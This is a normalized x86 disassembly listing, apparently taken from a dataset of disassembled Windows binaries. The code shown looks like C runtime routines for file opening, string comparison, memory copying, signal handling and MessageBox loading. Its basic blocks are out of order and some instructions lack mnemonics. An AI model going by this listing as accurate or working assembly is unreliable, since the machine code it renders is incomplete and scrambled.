lea eax [ ecx + eax + 0x24 ]
mov ecx [ ebp + 0x10 ]
mov dl [ eax ]
shr ecx 0x10
shl cl 0x7
and dl 0x7f
or cl dl
mov [ eax ] cl
cmp [ ebp - 0x3 ] bl
jne r-xdata
mov edi 0x74000
mov ecx 0x4000
test [ ebp + 0x10 ] edi
jne r-xdata
test [ ebp + 0x10 ] 0x2
je r-xdata
mov edi [ ebp - 0x8 ]
mov eax 0xc0000000
mov ecx edi
and ecx eax
cmp ecx eax
jne r-xdata
test [ ebp + 0x10 ] 0x8
je r-xdata
mov eax [ ebp + 0x10 ]
and eax edi
cmp eax ecx
je r-xdata
mov eax [ ebp - 0x20 ]
and eax edi
jne r-xdata
push 0x2
or edi 0xffffffff
push edi
push [ esi ]
call sub_406bf6
add esp 0xc
mov [ ebp - 0x18 ] eax
cmp eax edi
jne r-xdata
mov eax ebx
test [ ebp + 0x10 ] 0x1
je r-xdata
mov eax [ esi ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0x4 ]
or [ eax ] 0x20
mov [ ebp - 0x2 ] bl
cmp eax 0x10000
je r-xdata
or [ ebp + 0x10 ] eax
or [ ebp + 0x10 ] ecx
jmp r-xdata
push 0x1
lea eax [ ebp - 0x4 ]
push eax
push [ esi ]
mov [ ebp - 0x4 ] bl
call sub_408729
add esp 0xc
test eax eax
jne r-xdata
call sub_405cb9
cmp [ eax ] 0x83
je r-xdata
push [ ebp - 0x1c ]
call [ CloseHandle@IAT ]
push ebx
push [ ebp - 0xc ]
lea eax [ ebp - 0x30 ]
push 0x3
push eax
push [ ebp - 0x10 ]
and edi 0x7fffffff
push edi
push [ ebp + 0xc ]
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
jne r-xdata
test [ ebp - 0x1 ] 0x40
mov [ ebp - 0x18 ] ebx
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov eax 0x301
and ecx eax
cmp ecx eax
jne r-xdata
cmp eax 0x14000
je r-xdata
push ebx
push ebx
push [ esi ]
call sub_406bf6
add esp 0xc
cmp eax edi
je r-xdata
cmp [ ebp - 0x4 ] 0x1a
jne r-xdata
push [ esi ]
call sub_4057da
jmp r-xdata
mov esi [ esi ]
mov ecx esi
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
mov [ esi + ecx ] eax
call [ GetLastError@IAT ]
push eax
call sub_405ccc
mov eax [ esi ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0x4 ]
and [ eax ] 0xfe
push [ esi ]
call sub_406898
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov ecx 0xc0000000
and eax ecx
cmp eax 0x40000000
je r-xdata
test [ ebp + 0x10 ] 0x70000
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
cmp eax 0x20000
je r-xdata
mov eax [ ebp - 0x18 ]
cdq
push edx
push eax
push [ esi ]
call sub_40eb93
add esp 0xc
cmp eax edi
je r-xdata
pop ecx
mov eax [ ebp - 0x14 ]
cmp eax ebx
jbe r-xdata
cmp eax 0x80000000
je r-xdata
cmp eax 0x24000
je r-xdata
cmp eax 0x2
jbe r-xdata
push 0x3
lea eax [ ebp - 0x18 ]
push eax
push [ esi ]
call sub_408729
add esp 0xc
cmp eax 0xffffffff
je r-xdata
cmp eax ecx
jne r-xdata
cmp eax 0x40000
je r-xdata
movsx eax [ ebp - 0x2 ]
xor edi edi
dec eax
je r-xdata
cmp eax 0x4
ja r-xdata
cmp eax 0x2
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax ebx
jbe r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
cmp eax 0x44000
jne r-xdata
mov [ ebp - 0x18 ] 0xbfbbef
mov [ ebp - 0x14 ] 0x3
dec eax
jne r-xdata
cmp eax 0x5
jne r-xdata
push 0x2
push ebx
push ebx
push [ esi ]
call sub_40b44f
add esp 0x10
or eax edx
je r-xdata
mov eax [ ebp - 0x18 ]
and eax 0xffff
cmp eax 0xfffe
jne r-xdata
cmp eax 0x3
jne r-xdata
cmp eax 0x2
jbe r-xdata
add edi eax
cmp [ ebp - 0x14 ] edi
jg r-xdata
mov [ ebp - 0x18 ] 0xfeff
mov [ ebp - 0x14 ] 0x2
jmp r-xdata
push ebx
push ebx
push ebx
push [ esi ]
call sub_40b44f
add esp 0x10
and eax edx
cmp eax 0xfeff
jne r-xdata
push [ esi ]
call sub_4057da
pop ecx
call sub_405ca6
push 0x16
pop esi
mov [ eax ] esi
push ebx
push ebx
push [ esi ]
call sub_406bf6
add esp 0xc
jmp r-xdata
cmp [ ebp - 0x18 ] 0xbfbbef
jne r-xdata
cmp eax 0x4
jbe r-xdata
mov eax [ ebp - 0x14 ]
sub eax edi
push eax
lea eax [ ebp + edi - 0x18 ]
push eax
push [ esi ]
call sub_40673b
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
push ebx
push 0x2
push [ esi ]
call sub_406bf6
add esp 0xc
cmp eax 0xffffffff
je r-xdata
cmp eax 0xffffffff
jne r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
push 0x2
push ebx
push ebx
push [ esi ]
call sub_40b44f
add esp 0x10
or eax edx
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
push ebx
push ebx
push ebx
push [ esi ]
call sub_40b44f
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
sub_40cce4
push 0x14
push r--data
call sub_405254
xor esi esi
mov [ ebp - 0x1c ] esi
xor eax eax
mov edi [ ebp + 0x18 ]
cmp edi esi
setne al
cmp eax esi
jne r-xdata
or [ edi ] 0xffffffff
xor eax eax
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
je r-xdata
call sub_405ca6
push 0x16
pop edi
mov [ eax ] edi
push esi
push esi
push esi
push esi
push esi
call sub_405c3e
add esp 0x14
mov eax edi
jmp r-xdata
cmp [ ebp + 0x1c ] esi
je r-xdata
call sub_405299
retn
mov [ ebp - 0x4 ] esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_40c5c5
add esp 0x14
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40cd82
mov eax [ ebp - 0x20 ]
cmp eax esi
je r-xdata
mov eax [ ebp + 0x14 ]
and eax 0xfffffe7f
neg eax
sbb eax eax
inc eax
je r-xdata
or [ edi ] 0xffffffff
sub_40cd82
cmp [ ebp - 0x1c ] esi
je r-xdata
retn
cmp [ ebp - 0x20 ] esi
je r-xdata
push [ edi ]
call sub_406a35
pop ecx
mov eax [ edi ]
mov ecx eax
sar ecx 0x5
and eax 0x1f
shl eax 0x6
mov ecx [ ecx * 4 + rw-data ]
lea eax [ ecx + eax + 0x4 ]
and [ eax ] 0xfe
sub_40cdb0
mov edi edi
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_40cce4
add esp 0x18
pop ebp
retn
sub_40cdd0
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x18 ]
call sub_407138
xor ebx ebx
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0xc ] bl
je r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40ef30
add esp 0xc
cmp [ ebp - 0xc ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
push edi
mov edi [ ebp + 0xc ]
cmp edi ebx
jne r-xdata
call sub_405ca6
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_405c3e
add esp 0x14
cmp [ ebp - 0xc ] bl
je r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
push esi
call sub_405ca6
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_405c3e
add esp 0x14
cmp [ ebp - 0xc ] bl
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
movzx edx [ ebp - 0x8 ]
lea ecx [ edx + eax ]
test [ ecx + 0x1d ] 0x10
je r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
movzx ecx dx
movzx cx [ ecx + 0x11d ]
movzx ecx cx
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov dl [ edx ]
cmp dl bl
jne r-xdata
movzx ecx [ edi ]
test [ ecx + eax + 0x1d ] 0x4
mov [ ebp - 0x8 ] ebx
jne r-xdata
pop edi
movzx edx [ ebp - 0x4 ]
lea ecx [ edx + eax ]
test [ ecx + 0x1d ] 0x10
je r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov [ ebp - 0x8 ] ecx
shl ecx 0x8
movzx dx dl
or cx dx
inc [ ebp + 0x8 ]
movzx ecx cx
mov si cx
mov [ ebp - 0x8 ] ecx
cmp si [ eax + 0x10 ]
jb r-xdata
mov [ ebp - 0x8 ] ebx
jmp r-xdata
cmp [ ebp - 0xc ] bl
je r-xdata
movzx ecx cx
mov si bx
jmp r-xdata
movzx ecx dx
movzx cx [ ecx + 0x11d ]
movzx ecx cx
jmp r-xdata
mov dl [ edi ]
dec [ ebp + 0x10 ]
cmp dl bl
je r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
cmp si [ eax + 0x16 ]
jb r-xdata
cmp si [ eax + 0x12 ]
ja r-xdata
mov si [ ebp - 0x8 ]
xor eax eax
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
mov [ ebp - 0x4 ] ecx
sbb eax eax
and eax 0x2
dec eax
cmp [ ebp - 0xc ] bl
je r-xdata
cmp si bx
je r-xdata
shl ecx 0x8
movzx dx dl
or cx dx
movzx ecx cx
inc edi
mov [ ebp - 0x4 ] ecx
cmp cx [ eax + 0x10 ]
jb r-xdata
mov cx [ ebp - 0x4 ]
movzx cx [ edi ]
movzx ecx cx
movzx edx cl
inc edi
test [ edx + eax + 0x1d ] 0x4
mov [ ebp - 0x4 ] ecx
je r-xdata
cmp si [ eax + 0x18 ]
ja r-xdata
add si [ eax + 0x14 ]
jmp r-xdata
pop esi
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
cmp cx [ eax + 0x16 ]
jb r-xdata
cmp cx [ eax + 0x12 ]
ja r-xdata
add si [ eax + 0x1a ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
movzx cx [ ecx ]
dec [ ebp + 0x10 ]
inc [ ebp + 0x8 ]
movzx ecx cx
movzx edx cl
test [ edx + eax + 0x1d ] 0x4
mov [ ebp - 0x8 ] ecx
je r-xdata
cmp cx si
jne r-xdata
cmp cx [ eax + 0x18 ]
ja r-xdata
add cx [ eax + 0x14 ]
jmp r-xdata
add cx [ eax + 0x1a ]
jmp r-xdata
sub_40d015
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
cmp [ ebp + 0x10 ] ebx
jne r-xdata
push edi
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_407138
mov edi [ ebp - 0xc ]
cmp [ edi + 0x8 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40e826
add esp 0xc
cmp [ ebp - 0x4 ] bl
je r-xdata
pop ebx
leave
retn
push esi
mov esi [ ebp + 0xc ]
cmp esi ebx
jne r-xdata
call sub_405ca6
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_405c3e
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
pop edi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
mov eax [ ebp + 0x8 ]
movzx ax [ eax ]
dec [ ebp + 0x10 ]
inc [ ebp + 0x8 ]
movzx ecx ax
movzx eax cl
test [ eax + edi + 0x1d ] 0x4
je r-xdata
call sub_405ca6
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_405c3e
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
movzx ax [ esi ]
movzx eax ax
movzx edx al
inc esi
test [ edx + edi + 0x1d ] 0x4
je r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
cmp ax cx
jne r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov al [ eax ]
cmp al bl
jne r-xdata
movzx eax [ esi ]
xor ecx ecx
test [ eax + edi + 0x1d ] 0x4
je r-xdata
pop esi
sbb eax eax
and eax 0x2
dec eax
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp cx bx
je r-xdata
mov dl [ esi ]
dec [ ebp + 0x10 ]
cmp dl bl
je r-xdata
xor eax eax
jmp r-xdata
shl ecx 0x8
movzx ax al
or cx ax
inc [ ebp + 0x8 ]
movzx ecx cx
xor ecx ecx
jmp r-xdata
movzx eax ax
cmp [ ebp - 0x4 ] bl
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
movzx dx dl
shl eax 0x8
or ax dx
inc esi
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
sub_40d19c
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40d1bc
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_4045c5
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_40d201
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_40d201
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_40d1bc
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_40d2b1
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_40d2d0
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_40d2b1
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_40d2e0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x100
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_40d368 ]
jmp [ ecx * 4 + jump_table_40d3e8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40d454 ]
pop esi
pop edi
pop ebp
jmp sub_408eec
jmp [ ecx * 4 + jump_table_40d5f0 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_40d4f4 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40d5f0 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_40d454 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_40d5f0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40d454 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40d454 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40d454 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40d5f0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40d5f0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40d5f0 ]
sub_40d6ad
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
push esi
imul ecx ecx 0xc
add ecx [ ebp + 0x8 ]
pop esi
cmp eax ecx
jae r-xdata
mov esi ecx
imul esi esi 0xc
add esi [ ebp + 0x8 ]
add eax 0xc
cmp eax esi
jb r-xdata
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
pop ebp
retn
sub_40d6f1
push 0x20
push r--data
call sub_405254
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov ebx [ ebp + 0x8 ]
cmp ebx 0xb
jg r-xdata
mov eax ebx
sub eax 0xf
je r-xdata
je r-xdata
mov esi rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_40a69b
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax ebx
push 0x2
pop ecx
sub eax ecx
je r-xdata
call sub_405299
retn
cmp [ ebp - 0x20 ] eax
jne r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
mov edx ebx
call sub_40d6ad
mov esi eax
add esi 0x8
mov eax [ esi ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
cmp [ ebp - 0x1c ] eax
je r-xdata
push 0x3
call sub_409f5f
mov [ ebp - 0x1c ] 0x1
push eax
call sub_40a4c8
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_405ca6
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_405c3e
add esp 0x14
jmp r-xdata
mov [ ebp - 0x20 ] eax
pop ecx
xor eax eax
cmp [ ebp - 0x20 ] 0x1
je r-xdata
sub eax ecx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x8
je r-xdata
push eax
call sub_40917b
pop ecx
sub eax ecx
jne r-xdata
mov ecx [ edi + 0x60 ]
mov [ ebp - 0x2c ] ecx
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
call sub_40a4bf
mov [ esi ] eax
mov ecx [ edi + 0x64 ]
mov [ ebp - 0x30 ] ecx
mov [ edi + 0x64 ] 0x8c
cmp ebx 0x4
jne r-xdata
push ebx
call [ ebp - 0x20 ]
push [ edi + 0x64 ]
push ebx
call [ ebp - 0x20 ]
pop ecx
jmp r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0x24 ] ecx
cmp ebx 0x8
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
pop ecx
cmp ebx 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40d865
cmp ebx 0x8
jne r-xdata
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0xc
mov edx [ edi + 0x5c ]
mov [ ecx + edx + 0x8 ] eax
inc [ ebp - 0x24 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x30 ]
mov [ edi + 0x64 ] eax
cmp ebx 0x4
jne r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
add ecx edx
cmp [ ebp - 0x24 ] ecx
jge r-xdata
sub_40d8bf
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
call sub_40a4bf
and [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x0
mov ebx eax
jne r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push r--data
call [ LoadLibraryA@IAT ]
mov edi eax
test edi edi
je r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
xor eax eax
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
test eax eax
je r-xdata
push [ rw-data ]
call sub_40a4c8
pop ecx
test eax eax
je r-xdata
push eax
call sub_40a4c8
pop ecx
test eax eax
je r-xdata
push eax
call sub_40a4c8
push [ rw-data ]
mov esi eax
call sub_40a4c8
pop ecx
pop ecx
mov edi eax
test esi esi
je r-xdata
push eax
call sub_40a44d
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_40a44d
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_40a44d
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_40a44d
pop ecx
mov [ rw-data ] eax
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
call eax
jmp r-xdata
call eax
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
test edi edi
je r-xdata
push r--data
push edi
call esi
push eax
call sub_40a44d
pop ecx
mov [ rw-data ] eax
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
call esi
test eax eax
je r-xdata
push eax
call sub_40a4c8
pop ecx
test eax eax
je r-xdata
or [ ebp + 0x10 ] 0x200000
jmp r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push 0xc
lea ecx [ ebp - 0x14 ]
push ecx
push 0x1
push eax
call edi
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call eax
mov [ ebp - 0x4 ] eax
test [ ebp - 0xc ] 0x1
jne r-xdata
sub_40da28
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp eax ebx
je r-xdata
call sub_405ca6
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov edx eax
mov [ eax ] bl
jmp r-xdata
cmp edi ebx
je r-xdata
inc edx
dec edi
jne r-xdata
mov cl [ esi ]
mov [ edx ] cl
inc edx
inc esi
cmp cl bl
je r-xdata
cmp [ edx ] bl
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ eax ] bl
call sub_405ca6
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_405c3e
add esp 0x14
mov eax esi
jmp r-xdata
sub_40da9c
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
push edi
cmp [ ebp + 0x14 ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
jne r-xdata
call sub_405ca6
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
